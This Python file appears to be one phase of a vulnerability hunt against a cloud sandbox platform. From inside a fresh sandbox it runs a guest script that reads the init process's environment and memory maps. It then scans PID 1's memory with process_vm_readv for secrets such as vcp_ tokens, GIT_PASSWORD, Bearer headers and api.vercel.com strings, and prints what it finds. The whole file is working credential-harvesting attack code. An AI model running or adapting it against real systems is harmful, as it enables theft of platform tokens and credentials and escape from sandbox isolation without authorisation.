# -*- coding: utf-8 -*-
"""Phase27: ptrace 读 sandbox-init 内存 - environ/maps/字符串扫描"""
import sys, time
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os, re, ctypes

class IOV(ctypes.Structure):
    _fields_ = [('base', ctypes.c_void_p), ('len', ctypes.c_size_t)]
libc = ctypes.CDLL(None, use_errno=True)

def read_mem(pid, addr, size):
    buf = ctypes.create_string_buffer(size)
    iov = IOV(ctypes.cast(buf, ctypes.c_void_p), size)
    n = libc.process_vm_readv(pid, ctypes.byref(iov), 1, None, 0, 0)
    if n > 0:
        return buf.raw[:n]
    return None

# 1) init 环境变量
try:
    print('[init-environ]', open('/proc/1/environ').read().replace(chr(0), ' || ')[:2000], flush=True)
except Exception as e:
    print('[init-environ] ERR %s' % e, flush=True)

# 2) init 内存映射
maps = open('/proc/1/maps').read()
print('[maps-head]', maps[:1500], flush=True)

# 3) 扫描可读内存找关键字
KEYS = [b'vcp_', b'token', b'Token', b'TOKEN', b'secret', b'Secret', b'password',
        b'GIT_USERNAME', b'GIT_PASSWORD', b'vsock', b'http://', b'https://',
        b'api.vercel.com', b'oidc', b'Bearer', b'authorization', b'Authorization']
regions = []
for line in maps.splitlines():
    parts = line.split()
    if len(parts) < 2:
        continue
    perm = parts[1]
    if 'r' not in perm:
        continue
    if 'x' in perm:  # skip executable to be quick
        continue
    if '[' in line:  # skip [vdso] etc
        continue
    lo, hi = parts[0].split('-')
    try:
        addr = int(lo, 16)
        size = int(hi, 16) - addr
        regions.append((addr, size))
    except Exception:
        pass

found = {}
for addr, size in regions:
    # cap chunk at 4MB per region
    for off in range(0, size, 0x400000):
        chunk = read_mem(1, addr + off, min(0x400000, size - off))
        if not chunk:
            continue
        for k in KEYS:
            for m in re.finditer(re.escape(k), chunk):
                s = max(0, m.start() - 60)
                e = min(len(chunk), m.end() + 120)
                found.setdefault(k.decode('latin1'), []).append(
                    '0x%x:%s' % (addr + off + m.start(), chunk[s:e].replace(b'\x00', b' ').decode('latin1', 'replace')))
print('[found-keys]', flush=True)
for k, v in found.items():
    print('== %s ==' % k, flush=True)
    for item in v[:8]:
        print('   %s' % item, flush=True)

# 4) /proc/1/fd links (attach 后重试)
try:
    for f in sorted(os.listdir('/proc/1/fd'), key=int):
        try:
            print('[fd %s] %s' % (f, os.readlink('/proc/1/fd/%s' % f)), flush=True)
        except Exception as e:
            print('[fd %s] ERR %s' % (f, e), flush=True)
except Exception as e:
    print('[fd-list] ERR %s' % e, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg35.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg35.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest12")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=180000)
    print('cmd:', c, flush=True)
    print(r[:14000], flush=True)
